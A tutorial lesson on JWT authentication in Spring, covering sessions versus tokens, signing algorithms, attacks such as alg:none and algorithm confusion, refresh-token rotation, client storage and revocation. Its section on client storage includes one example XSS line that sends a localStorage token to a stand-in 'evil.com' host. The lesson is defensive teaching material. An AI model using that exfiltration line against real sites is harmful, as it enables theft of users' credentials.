# Lesson 26 — JWT & stateless authentication

> **Why this lesson exists:** JWT is the most cargo-culted technology in web development. Most developers can describe the three-part structure and nothing else — not revocation, not the storage trade-off, not why "stateless" is often a lie. Interviewers know this, so "walk me through your JWT implementation" is a fast way to find out how deeply someone thinks. This lesson gives you the depth *and* the skepticism.

**Time:** ~80 minutes · **Prereq:** Lesson 25

---

## 1. The idea in one sentence

> **A JWT's only security property is integrity: the payload is readable by anyone holding it, and it stays valid until `exp` no matter what you do — so "stateless auth" is a trade, and the moment you need real revocation you have bought state back.**

Say both halves and you've out-answered most candidates. The signature proves nobody edited the claims; it proves nothing about secrecy, freshness, or whether you still want that user to be an admin.

---

## 2. Sessions vs tokens — the actual trade-off

### Session-based (the traditional approach)

```
Login → server creates a session, stores it (memory/Redis/DB) → returns a cookie
                                                                 Set-Cookie: JSESSIONID=abc
Request → cookie sent automatically → server LOOKS UP the session → identity
Logout → server DELETES the session → instantly invalid ✅
```

**Pros:** trivial revocation (delete the row), small cookie, server controls everything, no token size limits.
**Cons:** the server must store state; horizontal scaling requires sticky sessions or a shared store (Redis); and cookies bring CSRF into scope.

### Token-based (JWT)

```
Login → server SIGNS a token containing the claims → returns it
Request → Authorization: Bearer <token> → server VERIFIES THE SIGNATURE → identity
Logout → ...the token is still valid until it expires ⚠️
```

**Pros:** no server-side session lookup, so any instance can verify; works cleanly for mobile/native clients; a resource server can validate without calling the auth server.
**Cons:** **you cannot revoke it**, tokens are large (sent on every request), claims go stale, and getting the implementation right is genuinely subtle.

### The honest comparison

| | Session | JWT |
|---|---|---|
| Server state | Required | None (in theory) |
| Revocation | ✅ Immediate | ❌ **Not without adding state** |
| Horizontal scaling | Needs a shared store | ✅ Any instance |
| Size per request | ~32 bytes | 500–2000 bytes |
| Claims freshness | Always current | **Stale until expiry** |
| Cross-domain / mobile | Awkward | ✅ Natural |
| CSRF exposure | Yes (cookies) | No, *if* sent as a header |
| Implementation risk | Low (framework-managed) | **Higher — many ways to get it wrong** |

**The contrarian point worth making, because it's true and it will surprise an interviewer:**

> *"For a single-application monolith with browser clients, a session in Redis is usually the better choice. It's simpler, revocation is free, and the state cost is trivial. JWT earns its complexity when you have multiple independent services that need to validate identity without calling a central auth service, or non-browser clients. The industry defaults to JWT for reasons that are often more fashion than analysis."*

That answer demonstrates judgment rather than pattern-matching, and it's a genuinely defensible position held by many experienced engineers.

---

## 3. JWT structure

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI3ZjNhIiwib3JnIjoiYTFiMiJ9.SflKxwRJSMeKK...
└──────────── header ────────────┘ └────────── payload ──────────┘ └─── signature ───┘
```

```json
// Header
{ "alg": "RS256", "typ": "JWT", "kid": "key-2026-07" }

// Payload — "claims"
{
  "iss": "https://api.vigil.io",        // issuer      — VERIFY THIS
  "sub": "7f3a2b1c-...",                // subject (user id)
  "aud": "vigil-api",                   // audience    — VERIFY THIS
  "exp": 1753838400,                    // expiry      — VERIFY THIS
  "iat": 1753834800,                    // issued at
  "jti": "b8e1...",                     // unique token id — needed for revocation
  "org": "a1b2c3d4-...",                // custom: current organization
  "roles": ["ROLE_USER"],               // custom: authorities
  "scope": "monitors:read monitors:write"
}
```

**The header and payload are base64url-encoded, NOT encrypted.** Anyone holding the token can read every claim — paste one into [jwt.io](https://jwt.io) and see. **Therefore: never put anything secret in a JWT.** No PII beyond what's necessary, no internal IDs you care about hiding, never a password or API key. (If you genuinely need confidentiality there's JWE — encrypted JWT — but it's rare and adds complexity.)

**The signature guarantees integrity, not confidentiality.** Change one character of the payload and verification fails. That's the entire security property.

### Signing algorithms

| Algorithm | Type | Use when |
|---|---|---|
| **HS256** | Symmetric (HMAC-SHA256) | One service signs and verifies. Simple. **The secret must be ≥256 bits.** |
| **RS256** | Asymmetric (RSA) | Multiple services verify. **They only need the public key** — they cannot mint tokens. |
| **ES256** | Asymmetric (ECDSA) | Same as RS256, smaller signatures, faster. Preferred over RSA for new systems. |
| `none` | ❌ | **Never.** See §4. |

**The decision rule:** **HS256** if one service both issues and validates. **RS256/ES256** if multiple services validate, because distributing a public key is safe while distributing a shared secret means any service could forge tokens for any other. **That's the real argument** — not performance.

---

## 4. The security mistakes — this section is the point of the lesson

### ❌ Mistake 1 — the `alg: none` attack

Some libraries once honoured `"alg": "none"` and skipped verification. An attacker takes your token, edits the payload to `"roles": ["ROLE_ADMIN"]`, sets `alg` to `none`, drops the signature — **and is now an admin.**

**Defence: always specify the expected algorithm on the verifier side, and reject anything else.** Never let the *token* decide how it's validated. Modern libraries (including Spring Security's) handle this, but the lesson generalizes: **never trust attacker-controlled input to select your security algorithm.**

### ❌ Mistake 2 — the algorithm confusion attack

Server verifies with RS256 using a public key. Attacker signs a forged token with **HS256, using the public key as the HMAC secret.** A naive verifier that just calls `verify(token, key)` treats the public key as an HMAC secret and the signature validates. **The public key is public — so the attacker can forge anything.**

Same defence: **pin the expected algorithm.**

```java
// ✅ Spring Security's decoder is explicit about the algorithm
NimbusJwtDecoder.withPublicKey(publicKey)
        .signatureAlgorithm(SignatureAlgorithm.RS256)     // ← pinned
        .build();
```

**Being able to describe the algorithm-confusion attack is a strong security signal** — it shows you understand JWT as an attack surface rather than a convenience.

### ❌ Mistake 3 — not validating the standard claims

Verifying the signature only proves *someone with the key* issued it. You must also check:
- **`exp`** — else tokens live forever
- **`iss`** — else a token from a *different* system signed with the same key (or a compromised sibling environment) is accepted
- **`aud`** — else a token intended for another service works on yours. **This is how a token for a low-privilege service gets replayed against a high-privilege one.**
- **`nbf`** (not before), if you use it

### ❌ Mistake 4 — a weak or committed secret

```yaml
jwt.secret: mysecretkey        # ❌ brute-forceable in seconds
```
HS256 requires ≥256 bits of entropy. Generate it properly (`openssl rand -base64 48`), keep it out of git (Lesson 12), and have a rotation plan.

### ❌ Mistake 5 — long-lived access tokens

A 30-day access token is a 30-day breach window with no way to close it. **Access tokens: 5–15 minutes.** Refresh tokens carry the long life, and *they* can be revoked because you store them.

### ❌ Mistake 6 — storing tokens in `localStorage`

Covered in §6 — the most-debated point in the topic and worth getting right.

---

## 5. Access + refresh tokens

```
┌──────────────────────────────────────────────────────────────────────────┐
│  ACCESS TOKEN                      │  REFRESH TOKEN                      │
│  · JWT, signed                     │  · Opaque random string (NOT a JWT) │
│  · 5–15 minutes                    │  · 7–30 days                        │
│  · Sent with every request         │  · Sent ONLY to /auth/refresh       │
│  · NOT stored server-side          │  · ★ STORED server-side (hashed)    │
│  · Cannot be revoked               │  · ✅ Revocable — delete the row     │
└──────────────────────────────────────────────────────────────────────────┘
```

**Why the refresh token should be opaque, not a JWT:** you're storing it server-side anyway, so the JWT's self-contained property buys nothing — and a random opaque string leaks no information and can't be misused as an access token by a confused endpoint. **This is a real design detail most implementations get wrong**, and pointing it out is a nice differentiator.

**And hash it before storing.** A refresh-token table in plaintext is a set of long-lived credentials; if the database leaks, every user is compromised. Store `SHA-256(token)` — you only ever need to *compare*, never to read it back.

```
Login          → access (15m) + refresh (30d)
                 refresh_token table: (id, user_id, token_hash, family_id, expires_at, revoked)

API request    → Bearer <access>. Signature + claims verified locally. NO DB HIT. ✅

Access expires → 401 → client POSTs the refresh token to /auth/refresh
                 → look up hash → validate → issue NEW access AND NEW refresh
                 → ★ revoke the old refresh token (ROTATION)

Logout         → revoke the refresh token (and optionally blacklist the access token's jti)
```

### Refresh token rotation and reuse detection

**Rotation:** every refresh issues a *new* refresh token and invalidates the old one. So a stolen refresh token is only useful until the legitimate client next refreshes.

**Reuse detection — the clever part:**

```java
@Transactional
public TokenPair refresh(String presentedToken) {
    String hash = sha256(presentedToken);
    RefreshToken stored = refreshTokenRepository.findByTokenHash(hash)
            .orElseThrow(() -> new InvalidTokenException());

    if (stored.isRevoked()) {
        // ★ An already-used token was presented again. Either the legitimate client
        //   retried, or a token was STOLEN and both parties are now using the family.
        //   Assume theft: kill the entire family.
        refreshTokenRepository.revokeFamily(stored.getFamilyId());
        auditService.securityEvent("REFRESH_TOKEN_REUSE", stored.getUserId());
        throw new SecurityBreachException("token reuse detected — all sessions revoked");
    }
    if (stored.getExpiresAt().isBefore(Instant.now()))
        throw new InvalidTokenException();

    stored.revoke();
    return issueTokenPair(stored.getUserId(), stored.getFamilyId());   // same family
}
```

**Why this works:** rotation means each refresh token is single-use. If a token is used twice, someone has a copy they shouldn't. You can't tell *which* party is the attacker — so you revoke the whole family, forcing a fresh login. **The user is inconvenienced once; the attacker is evicted.**

This is the OAuth 2.0 Security BCP recommendation for public clients, and **describing reuse detection is one of the most impressive things you can say about JWT in an interview** — it demonstrates you've thought about the failure mode rather than the happy path.

---

## 6. Where to store the token on the client

**The most contested question in the topic. Know both sides.**

| | `localStorage` | `httpOnly` cookie |
|---|---|---|
| Readable by JavaScript | ✅ **so XSS steals it** | ❌ **XSS cannot read it** |
| Sent automatically | ❌ you attach it | ✅ **so CSRF applies** |
| Works cross-domain | ✅ easily | Needs `SameSite=None; Secure` + CORS credentials |
| Mobile/native clients | ✅ (secure storage) | ⚠️ awkward |

**The argument, stated fairly:**

- **`localStorage`:** any XSS — including from a compromised npm dependency — exfiltrates the token with `fetch('evil.com?t='+localStorage.token)`. The attacker then has a valid token usable from anywhere, and you cannot revoke it.
- **`httpOnly` cookie:** XSS **cannot read** the token. An attacker with XSS can still *make requests* as the user (they're in your origin), but they can't steal the credential and use it elsewhere or after you've cleaned up. That's a meaningfully smaller blast radius. The cost is CSRF exposure, which you address with `SameSite=Strict/Lax` plus CSRF tokens.

**The consensus position among security-focused engineers:**

> **`httpOnly` + `Secure` + `SameSite=Strict` cookies for browser clients, with CSRF protection. `localStorage` (or platform secure storage) only for native/mobile clients where cookies don't fit.**

```java
ResponseCookie cookie = ResponseCookie.from("refresh_token", token)
        .httpOnly(true)                    // JS cannot read it
        .secure(true)                      // HTTPS only
        .sameSite("Strict")                // not sent on cross-site requests
        .path("/api/v1/auth/refresh")      // ★ sent ONLY to the refresh endpoint
        .maxAge(Duration.ofDays(30))
        .build();
```

**That `path` restriction is a nice touch:** the refresh token isn't transmitted on ordinary API calls at all, so it's exposed in far fewer places.

**A common hybrid worth knowing:** refresh token in an `httpOnly` cookie (long-lived, must be protected), access token held **in JavaScript memory only** (never persisted, so a page reload silently re-refreshes). XSS can use the in-memory token while the page is open but can't steal a persistent credential, and there's nothing to exfiltrate after the tab closes. **This is what several mature SPAs do**, and describing it shows real familiarity.

**And the honest caveat to state either way:** *"If you have XSS, you have a serious problem regardless. Token storage limits the blast radius; it doesn't substitute for output encoding and a strict Content-Security-Policy."* That framing is more credible than treating storage choice as the whole answer.

---

## 7. Revocation — the hard problem

**A signed JWT is valid until `exp`. There is no way to un-issue it.** So:

| Approach | How | Trade-off |
|---|---|---|
| **Short expiry** | 5–15 min access tokens | ✅ Simple. Breach window = token lifetime. **Usually sufficient.** |
| **Revoke refresh tokens only** | Delete the DB row | ✅ New access tokens stop; existing ones live out their minutes |
| **Blacklist by `jti`** | Redis set, TTL = remaining life | ⚠️ **You've reintroduced state** — one lookup per request |
| **Token version per user** | A `token_version` claim compared to a DB/cache value | ⚠️ Also a lookup, but enables "log out everywhere" |
| **Short-lived + sender-constrained** | DPoP / mTLS binding | Strongest; complex |

**The key admission — and interviewers are listening for it:**

> *"Once you add a blacklist, JWT is no longer stateless. You're doing a lookup per request, which is exactly what a session does — except a session is simpler and gives you immediate revocation for free. So the honest position is: accept a short window and revoke only refresh tokens, or acknowledge you need statefulness and choose the design that gives it to you cleanly."*

**Practical middle ground, and what Vigil does:**
- Access tokens: 15 minutes, verified locally, no lookup
- Refresh tokens: stored, hashed, rotated, with reuse detection
- Logout: revoke the refresh token
- **A `token_version` claim** checked against a cached per-user value — bumped on password change, role change, or "log out everywhere." One cheap cache read, and it covers the cases where a 15-minute delay genuinely isn't acceptable (a compromised account, a revoked admin).

**The stale-claims problem is the same issue in a different costume:** you demote a user from admin at 10:00, and their token says `ROLE_ADMIN` until 10:15. For a privilege *reduction* that's a real security gap, and `token_version` is the answer. Raising this unprompted is a strong signal, because it's the failure mode people forget entirely.

---

## 8. Implementation in Spring

### The recommended way: `oauth2-resource-server`

**Don't hand-roll JWT parsing.** Spring Security has a maintained, correct implementation:

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-resource-server</artifactId>
</dependency>
```

```yaml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          # Option A — an external issuer (Keycloak, Auth0, Cognito): fetches the JWKS itself
          issuer-uri: https://auth.vigil.io/realms/vigil
          # Option B — self-issued with a symmetric secret
          # (configure a JwtDecoder bean instead, see below)
```

```java
@Bean
SecurityFilterChain api(HttpSecurity http, JwtAuthenticationConverter converter) throws Exception {
    return http
        .securityMatcher("/api/**")
        .csrf(AbstractHttpConfigurer::disable)
        .sessionManagement(s -> s.sessionCreationPolicy(STATELESS))
        .oauth2ResourceServer(o -> o.jwt(j -> j.jwtAuthenticationConverter(converter)))
        .authorizeHttpRequests(a -> a
            .requestMatchers("/api/v1/auth/**").permitAll()
            .anyRequest().authenticated())
        .build();
}

// Map your custom claims to Spring authorities
@Bean
JwtAuthenticationConverter jwtAuthenticationConverter() {
    var authorities = new JwtGrantedAuthoritiesConverter();
    authorities.setAuthoritiesClaimName("roles");
    authorities.setAuthorityPrefix("");                    // ★ our claim already has ROLE_
    var converter = new JwtAuthenticationConverter();
    converter.setJwtGrantedAuthoritiesConverter(authorities);
    return converter;
}
```

**`setAuthorityPrefix("")` is where the `ROLE_` confusion from Lesson 25 usually bites in a JWT setup.** By default this converter prefixes `SCOPE_`. If your claim contains `ROLE_ADMIN` and the converter prefixes it, you end up looking for `SCOPE_ROLE_ADMIN` and get a mystifying 403. **Genuinely valuable to know.**

**And you get all of this for free:** signature verification with a pinned algorithm, `exp`/`nbf`/`iss`/`aud` validation, JWKS fetching and caching with `kid`-based key selection, key rotation support, and a correct 401 with a `WWW-Authenticate` header. **Hand-rolling means reimplementing all of it, correctly, forever.**

### Issuing tokens

```java
@Service
@RequiredArgsConstructor
public class TokenService {

    private final JwtEncoder jwtEncoder;                    // from a JWK source bean
    private final RefreshTokenRepository refreshTokens;

    private static final Duration ACCESS_TTL = Duration.ofMinutes(15);
    private static final Duration REFRESH_TTL = Duration.ofDays(30);

    public TokenPair issue(VigilUser user, UUID orgId, UUID familyId) {
        Instant now = Instant.now();

        JwtClaimsSet claims = JwtClaimsSet.builder()
                .issuer("https://api.vigil.io")
                .audience(List.of("vigil-api"))
                .subject(user.getId().toString())
                .issuedAt(now)
                .expiresAt(now.plus(ACCESS_TTL))
                .id(UUID.randomUUID().toString())                    // jti
                .claim("org", orgId.toString())
                .claim("roles", user.authoritiesFor(orgId))
                .claim("tv", user.getTokenVersion())                  // ★ for revocation
                .build();

        String access = jwtEncoder.encode(JwtEncoderParameters.from(claims)).getTokenValue();

        String refresh = generateOpaqueToken();                       // 32 random bytes, base64url
        refreshTokens.save(RefreshToken.builder()
                .tokenHash(sha256(refresh))                           // ★ hashed at rest
                .userId(user.getId())
                .familyId(familyId != null ? familyId : UUID.randomUUID())
                .expiresAt(now.plus(REFRESH_TTL))
                .build());

        return new TokenPair(access, refresh, ACCESS_TTL.toSeconds());
    }

    private String generateOpaqueToken() {
        byte[] bytes = new byte[32];
        new SecureRandom().nextBytes(bytes);                          // ★ SecureRandom, not Random
        return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
    }
}
```

**`SecureRandom`, never `Random`.** `java.util.Random` is a linear congruential generator: observe a couple of outputs and you can predict all future ones. For anything security-relevant — tokens, password reset codes, session IDs, nonces — it's a critical vulnerability. **This is a small line with an outsized consequence, and it's a good thing to flag in a code review.**

### The `token_version` validator

```java
@Component
@RequiredArgsConstructor
public class TokenVersionValidator implements OAuth2TokenValidator<Jwt> {

    private final UserTokenVersionCache cache;              // Redis or Caffeine, short TTL

    @Override
    public OAuth2TokenValidatorResult validate(Jwt jwt) {
        UUID userId = UUID.fromString(jwt.getSubject());
        int current = cache.currentVersion(userId);
        int presented = jwt.getClaim("tv");
        return presented == current
                ? OAuth2TokenValidatorResult.success()
                : OAuth2TokenValidatorResult.failure(
                      new OAuth2Error("invalid_token", "token has been revoked", null));
    }
}
```

Bump the user's `token_version` on password change, role change, or "log out everywhere," and every existing access token is invalidated immediately. **One cached read per request** — the honest cost of real revocation, stated plainly.

---

## 9. Build & break — Vigil's auth endpoints

**1. Endpoints:**
```
POST /api/v1/auth/register    → create the user + organization, return tokens
POST /api/v1/auth/login       → validate credentials, return tokens
POST /api/v1/auth/refresh     → rotate, return new tokens
POST /api/v1/auth/logout      → revoke the refresh token
GET  /api/v1/auth/me          → current user + org + roles
```

**2. Keys.** Generate an RSA keypair (`openssl genrsa`, then extract the public key) and configure `JwtEncoder`/`JwtDecoder` with a `JWKSource`. Load the private key from an environment variable or mounted file — **never from the repo** (Lesson 12).

**3. The refresh-token table** with `token_hash`, `family_id`, `expires_at`, `revoked_at`, `user_id`. Index `token_hash`. Write the Flyway migration.

**4. Rotation with reuse detection** exactly as in §5.

**5. Wire up the resource server** with `oauth2ResourceServer` and a `JwtAuthenticationConverter`. **Do not write your own JWT filter** — but *do* read `BearerTokenAuthenticationFilter`'s source to see what you're not writing.

### Break these on purpose — every one is a real attack or bug

**a) ⭐ Tamper with a token.** Take a valid token, base64-decode the payload, change `"roles"` to `["ROLE_ADMIN"]`, re-encode, reassemble with the original signature, and call an admin endpoint. **401.** Then paste both tokens into jwt.io and see the signature mismatch. **This is the moment JWT integrity becomes real rather than theoretical.**

**b) Read your own token.** Paste it into jwt.io and read every claim. **Confirm you can read it all without any key.** Now grep your codebase for anything sensitive you might have put in a claim.

**c) Expire it.** Set `ACCESS_TTL` to 5 seconds. Call an endpoint, wait 6 seconds, call again. Read the 401 and the `WWW-Authenticate` header — Spring tells the client exactly why.

**d) Reuse detection.** Refresh once (getting token B), then present the *old* refresh token A again. **Confirm the entire family is revoked** and that B no longer works either. Check your audit log. **Then explain to yourself why revoking B — a token that was legitimately issued — is the correct behaviour.**

**e) The `ROLE_` prefix in a JWT.** Put `"roles": ["ADMIN"]` in the claim, use `.hasRole("ADMIN")` with the default converter, and watch the 403. Trace it: the converter prefixed it to `SCOPE_ADMIN`, and `hasRole` wants `ROLE_ADMIN`. **Fix it and note how non-obvious that was.**

**f) Skip audience validation.** Issue a token with `aud: "some-other-service"` and confirm your API **accepts** it if you didn't configure audience validation. Then add the validator and confirm it's rejected. **That's a real cross-service token-replay vulnerability, demonstrated in five minutes.**

**g) `Random` vs `SecureRandom`.** Generate 5 tokens with `new Random(42)`. Restart and generate 5 more. **Identical.** Sit with what that means for a password-reset token.

**h) Token version revocation.** Implement the validator, bump a user's version, and confirm their still-unexpired access token stops working immediately.

**6. Cookie-based storage.** Return the refresh token as an `httpOnly`, `Secure`, `SameSite=Strict` cookie scoped to `/api/v1/auth/refresh`, and the access token in the JSON body (for the client to hold in memory). Verify in DevTools that JavaScript **cannot** read the refresh cookie (`document.cookie` doesn't show it).

**7. Write the security tests.**
```java
@Test void unauthenticatedRequestIs401() { }
@Test void expiredTokenIs401() { }
@Test void tamperedTokenIs401() { }
@Test void tokenForWrongAudienceIs401() { }
@Test void userRoleCannotAccessAdminEndpointAndGets403() { }
@Test void refreshTokenReuseRevokesEntireFamily() { }
@Test void refreshTokenIsHashedInDatabase() { }        // ← assert the raw token isn't stored
```
**These tests are worth more on a resume than the feature itself.** Almost nobody writes negative security tests, and a reviewer who sees them draws immediate conclusions about how you work.

### Explain out loud (60s)

1. What a JWT's signature guarantees, and what it does not.
2. The honest sessions-vs-JWT comparison, and when you'd pick a session.
3. Refresh token rotation and reuse detection — including why revoking the legitimate token is correct.
4. Three ways to revoke, and what each one costs.
5. The stale-claims problem, with the demoted-admin example.

---

## 10. Production rules

| Do / Never | Why |
|---|---|
| **Never put anything secret in a JWT** | Header and payload are base64url, not encrypted — anyone with the token reads every claim, as jwt.io demonstrates in five seconds |
| **Pin the expected algorithm on the verifier and reject anything else** | `alg: none` and algorithm confusion both work by letting the *token* choose how it's validated |
| **Validate `exp`, `nbf`, `iss` and `aud`, not just the signature** | A perfectly signed token issued for another service is still a cross-service replay unless you check who it was addressed to |
| **HS256 when one service issues and verifies; RS256/ES256 when several verify** | Distributing a public key is safe; distributing a shared secret means any holder can forge tokens for everyone |
| **Keep access tokens to 5–15 minutes** | The breach window for a token you cannot revoke *is* its lifetime, and short expiry is the one mitigation that costs nothing |
| **Make refresh tokens opaque random strings, and store only their hash** | You're storing them server-side anyway, so a JWT buys nothing — and a plaintext refresh table is a set of long-lived credentials waiting to leak |
| **Generate every token with `SecureRandom`, never `Random`** | `Random` is a linear congruential generator: a few outputs reveal all future ones, which for a password-reset token is total compromise |
| **Rotate refresh tokens and revoke the whole family on reuse** | Rotation makes each one single-use, so a second use proves someone has a copy — you can't tell which party, so you evict both |
| **Use `oauth2-resource-server`; never hand-roll a JWT filter** | Signature verification, claim validation, JWKS fetching, `kid` selection, key rotation and a correct `WWW-Authenticate` are all already correct there |
| **Check `setAuthorityPrefix` on your `JwtAuthenticationConverter`** | It prefixes `SCOPE_` by default, so a `ROLE_ADMIN` claim becomes `SCOPE_ROLE_ADMIN` and `hasRole` fails mystifyingly |
| **Prefer `httpOnly; Secure; SameSite=Strict` cookies for browser clients** | XSS cannot read them; `localStorage` is readable by any injected script, and the access token can live in memory instead |
| **Add a `token_version` claim when privilege reduction must take effect now** | Otherwise a demoted admin keeps `ROLE_ADMIN` until their token expires — the stale-claims gap people forget entirely |
| **Say out loud that a blacklist makes JWT stateful** | Once there's a lookup per request you have a session with extra steps, and choosing a session deliberately is the better engineering |

---

## 11. Interview traps

**Q1. What is a JWT and what are its parts?**
Header (algorithm, key id), payload (claims), signature — base64url-encoded and dot-separated. The header and payload are **encoded, not encrypted**: anyone with the token can read every claim. The signature provides integrity and authenticity only.

**Q2. Sessions or JWT — which would you choose?**
Depends. For a single application with browser clients, a session in Redis is often simpler and better: revocation is free and the state cost is trivial. JWT earns its complexity when multiple independent services must validate identity without calling a central auth service, or for non-browser clients. Defaulting to JWT is frequently fashion rather than analysis.

**Q3. How do you revoke a JWT?**
Strictly, you can't — it's valid until `exp`. Practical options: short-lived access tokens (5–15 min) with revocable stored refresh tokens; a `jti` blacklist in Redis; or a `token_version` claim compared against a cached per-user value. **The honest point: any of the latter two reintroduces state, which is exactly what a session does — so if you truly need instant revocation, question whether stateless was the right premise.**

**Q4. Why access + refresh tokens?**
To decouple "how long is a stolen credential useful" from "how often must the user log in." The access token is short-lived and needs no lookup; the refresh token is long-lived, stored server-side (hashed), and revocable. Should the refresh token be a JWT? No — it's stored anyway, so an opaque random string is simpler and leaks nothing.

**Q5. What is refresh token rotation and reuse detection?**
Each refresh issues a new refresh token and invalidates the old one, so a stolen token is useful only until the next legitimate refresh. If an already-used token is presented, someone has a copy they shouldn't — you can't tell which party, so you revoke the whole token **family** and force re-authentication. It's the OAuth 2.0 Security BCP recommendation.

**Q6. `localStorage` or cookies for tokens?**
`httpOnly` + `Secure` + `SameSite=Strict` cookies for browsers: XSS can't read the token, so it can't be exfiltrated and reused elsewhere. The cost is CSRF, handled by `SameSite` plus CSRF tokens. `localStorage` is readable by any injected script — including from a compromised dependency. A good hybrid: refresh token in an httpOnly cookie, access token in JavaScript memory only. And regardless: token storage limits blast radius, it doesn't replace output encoding and CSP.

**Q7. HS256 or RS256?**
HS256 (symmetric) when one service both issues and validates. RS256/ES256 (asymmetric) when multiple services validate — they need only the public key and therefore cannot mint tokens, whereas a shared secret would let any service forge tokens for any other. ES256 is preferred over RSA for new systems (smaller, faster).

**Q8. Describe the algorithm confusion attack.**
A server verifies RS256 with a public key. The attacker signs a forged token with **HS256 using that public key as the HMAC secret**. A verifier that lets the token's `alg` header choose the algorithm will validate it — and the key is public, so anything can be forged. Defence: pin the expected algorithm on the verifier and reject all others. The same principle kills `alg: none`.

**Q9. Which claims must you validate beyond the signature?**
`exp` (expiry), `iss` (issuer), `aud` (audience), and `nbf` if used. Skipping `aud` allows a token minted for a different service to be replayed against yours — a real privilege-escalation path in a multi-service system.

**Q10. What can't you put in a JWT?**
Anything confidential. The payload is base64-encoded plaintext. Also avoid large claim sets — the token travels on every request, and browsers/proxies limit header sizes; a bloated token can produce a 431 error that's baffling to debug.

**Q11. Should you write your own JWT filter?**
No. Use `spring-boot-starter-oauth2-resource-server`, which gives you pinned-algorithm signature verification, standard claim validation, JWKS fetching/caching with `kid` selection, key rotation, and spec-correct 401 responses with `WWW-Authenticate`. Hand-rolling means reimplementing all of that correctly and maintaining it.

**Q12. What's the stale-claims problem?**
Claims are frozen at issue time. Demote a user at 10:00 and their token still says `ROLE_ADMIN` until it expires — a real gap for privilege *reductions*. Mitigations: very short access tokens, or a `token_version`/`auth_time` claim checked against current state.

**Q13. Why `SecureRandom` instead of `Random`?**
`java.util.Random` is a predictable LCG — a few observed outputs let an attacker compute all future values. Any security-relevant value (tokens, reset codes, nonces, session IDs) must come from `SecureRandom`.

---

## 12. Retention check

1. What exactly does a JWT signature guarantee, and what does it not?
2. Explain refresh token rotation and why reuse detection revokes tokens that were legitimately issued.
3. Give the precise argument for httpOnly cookies over localStorage, and the honest caveat.
4. Describe the algorithm confusion attack and its one-line defence.
5. Why does adding a `jti` blacklist undermine the case for JWT?
6. Name the four standard claims you must validate, and what skipping `aud` allows.

---

**Next:** [Lesson 27 — OAuth2, OIDC & social login](27-oauth2-oidc-social-login.md) — the flows, PKCE, and wiring up "Sign in with Google."
